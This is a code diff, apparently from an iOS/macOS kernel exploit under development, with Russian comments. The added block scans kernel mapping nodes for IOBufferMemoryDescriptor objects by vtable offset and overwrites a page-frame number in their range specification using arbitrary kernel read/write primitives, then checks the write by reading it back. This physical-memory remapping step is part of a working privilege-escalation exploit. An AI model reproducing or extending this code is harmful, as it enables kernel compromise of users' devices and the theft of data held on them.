@@ -7493,6 +7493,45 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint32_t ncount = kpLooksLikeKernelPointer(pipeVA) ? ((uint32_t)early_kread64(pipeVA + 0x180) & 0xff) : 0;
         kpNote(r, [NSString stringWithFormat:@"  [P2] mapping-список: head=%#llx count=%u",
                   (unsigned long long)node, ncount]);
+        // 1.9.235: CLASS-DISCOVERY per-op IOBufferMD (владелец spec) — очереди и
+        // credit мертвы (op=0 всех походов, sel10 не ложится). Скан mapping-нод на
+        // vtable == 0x7b33db8 (IOBufferMemoryDescriptor): наш desc → [desc+0x60] =
+        // ranges-spec → +0x58 pfn32 = patch-point. Точная дискавери по классу.
+        {
+            uint64_t node235 = node;
+            int nFound = 0;
+            for (uint32_t ni = 0; ni < 8 && kpLooksLikeKernelPointer(node235) && kpSafeToRead(node235) && !nSpec; ni++) {
+                for (uint32_t o = 0; o + 8 <= 0xa0 && !nSpec; o += 8) {
+                    uint64_t Q = kp_untag_ptr(early_kread64(node235 + o));
+                    if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                    uint64_t vt = kp_untag_ptr(early_kread64(Q));
+                    if ((uint32_t)(vt ? vt - kslide2 : 0) != 0x7b33db8) continue;
+                    nFound++;
+                    uint64_t spec235 = kp_untag_ptr(early_kread64(Q + 0x60));
+                    uint64_t v = (kpLooksLikeKernelPointer(spec235) && kpSafeToRead(spec235)) ? early_kread64(spec235 + 0x58) : 0;
+                    kpNote(r, [NSString stringWithFormat:@"  [DSC] ★ IOBufferMD node[%u]+%#x=%#llx spec=%#llx +0x58=%#018llx",
+                              ni, o, (unsigned long long)Q, (unsigned long long)spec235, (unsigned long long)v]);
+                    if ((uint32_t)v == pfn32) {
+                        uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                        kpNote(r, [NSString stringWithFormat:@"  [DSC] ★★ spec+0x58 через класс: %#018llx → %#018llx", (unsigned long long)v, (unsigned long long)nq]);
+                        usleep(2000);
+                        early_kwrite64(spec235 + 0x58, nq);
+                        uint64_t rb = early_kread64(spec235 + 0x58);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        specVA[nSpec] = spec235 + 0x58; specOld[nSpec] = v; nSpec++;
+                    } else if (kpLooksLikeKernelPointer(spec235) && kpSafeToRead(spec235)) {
+                        for (uint32_t o2 = 0; o2 + 8 <= 0x64; o2 += 8)
+                            kpNote(r, [NSString stringWithFormat:@"    dsc-spec+%#x: %#018llx", o2, (unsigned long long)early_kread64(spec235 + o2)]);
+                    }
+                }
+                uint64_t nx = kp_untag_ptr(early_kread64(node235 + 0x20));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) nx = kp_untag_ptr(early_kread64(node235 + 0x10));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) nx = kp_untag_ptr(early_kread64(node235 + 0x8));
+                if (!kpLooksLikeKernelPointer(nx) || nx == node235) break;
+                node235 = nx;
+            }
+            if (!nFound) kpNote(r, @"  [DSC] IOBufferMD (0x7b33db8) в нодах нет — desc по другой цепи");
+        }
         for (uint32_t ni = 0; ni < 32 && kpLooksLikeKernelPointer(node) && kpSafeToRead(node) && !cmdVA; ni++) {
             if ((uint32_t)(node & 0x3fff) + 0xa0 > 0x4000) break;
             // 1.9.185: дамп всех qwords ноды (0xA0): ищем cmd (vt 0x7afa9e8) и
